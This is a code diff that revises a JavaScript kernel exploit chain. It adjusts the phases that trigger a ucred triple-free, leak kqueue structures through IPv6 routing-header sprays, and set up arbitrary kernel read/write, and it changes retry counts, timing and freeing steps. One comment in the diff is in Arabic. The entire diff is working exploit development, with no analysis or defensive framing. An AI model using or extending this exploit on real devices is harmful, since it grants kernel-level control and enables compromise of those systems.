@@ -1036,46 +1036,30 @@ function netctrl_exploit() {
 }
 
 function exploit_phase_setup() {
-  if (exploit_end) return;
-
-  var ok = false;
-  try { ok = setup(); }
-  catch(e) { ok = false; }
-
+  var ok = setup();
   if (!ok) {
-    log('Setup failed — aborting.');
+    log('Setup failed, aborting exploit.');
     cleanup();
-    exploit_end = true;
     return;
   }
-
   log('Workers spawned');
   exploit_count = 0;
-  exploit_end   = false;
-
+  exploit_end = false;
   yield_to_render(exploit_phase_trigger);
 }
 function exploit_phase_trigger() {
-  if (exploit_end) return;
-
   if (exploit_count >= MAIN_LOOP_ITERATIONS) {
-    log('Max attempts reached — stopping.');
+    log('Failed to acquire kernel R/W');
     cleanup();
     return;
   }
-  let ok = false;
-  try { ok = trigger_ucred_triplefree(); }
-  catch(e) { ok = false; }
   exploit_count++;
-  log('Triggering attempt ' + exploit_count + '/' + MAIN_LOOP_ITERATIONS);
-
-  if (!ok) {
-    log('Trigger failed — retrying...');
+  log('Triggering ..... ');
+  if (!trigger_ucred_triplefree()) {
     yield_to_render(exploit_phase_trigger);
     return;
   }
-
-  log('Leaking...');
+  log('Leaking .....');
   yield_to_render(exploit_phase_leak);
 }
 function exploit_phase_leak() {
@@ -1091,7 +1075,6 @@ function exploit_phase_leak() {
     return;
   }
 
-  log('Preparing R/W...');
   yield_to_render(exploit_phase_rw);
 }
 function exploit_phase_rw() {
@@ -1202,7 +1185,6 @@ function setup_arbitrary_rw() {
 
   remove_uaf_file();
 
-  log('Arbitrary R/W ready');
 }
 
 function find_allproc() {
@@ -1672,7 +1654,7 @@ function leak_kqueue() {
   var magic_val = new BigInt(0x0, 0x1430000);
   var magic_add = leak_rthdr.add(0x08);
   var count = 0;
-  var MAX_KQ = 6000;
+  var MAX_KQ = 5000;
 
   while (count < MAX_KQ) {
     count++;
@@ -1682,12 +1664,13 @@ function leak_kqueue() {
       log('leak_kqueue: kqueue() failed');
       return false;
     }
-
+    // نحرر triplets[1] عشان نستخدمه في التسريب
+    free_rthdr(ipv6_socks[triplets[1]]);
     // تصفير جزء من leak_rthdr قبل القراءة (لتفادي بقايا قديمة)
     write64(magic_add, 0);
     write64(leak_rthdr.add(0x98), 0);
 
-    nanosleep_fun(0.2);
+    nanosleep_fun(0);
     
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
 
@@ -1700,13 +1683,14 @@ function leak_kqueue() {
 
     close(kq);
     sched_yield();
+    nanosleep_fun(0);
   }
-  nanosleep_fun(0.2);
+  
   if (count >= MAX_KQ) {
     log('leak_kqueue: exceeded MAX_KQ iterations');
     return false;
   }
-
+  nanosleep_fun(0);
   kl_lock = read64(leak_rthdr.add(0x60));
   kq_fdp  = read64(leak_rthdr.add(0x98));
 
